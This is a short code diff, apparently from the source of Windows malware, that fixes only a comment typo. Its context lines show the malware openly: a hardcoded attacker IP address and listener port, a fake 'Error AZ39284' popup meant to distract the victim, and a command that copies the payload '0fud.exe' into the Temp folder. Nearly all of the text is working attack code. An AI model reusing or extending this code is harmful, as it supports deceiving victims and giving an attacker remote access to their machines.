@@ -80,7 +80,7 @@ int main(int argc, char **argv) {
         char host[] = "192.168.88.132";  // Attacker IP Address
         int port = 443;                  // Attacker listener PORT
         
-        // Addictional features below
+        // Additional features below
         Sleep(5); // 5 seconds start delay
         MessageBox(NULL, TEXT("Error AZ39284"), TEXT("Error Message"), MB_OK | MB_ICONERROR); // Generic error popup to distract the victim
         system("cmd /c copy .\\0fud.exe %Temp%");  // copy malware to temp folder
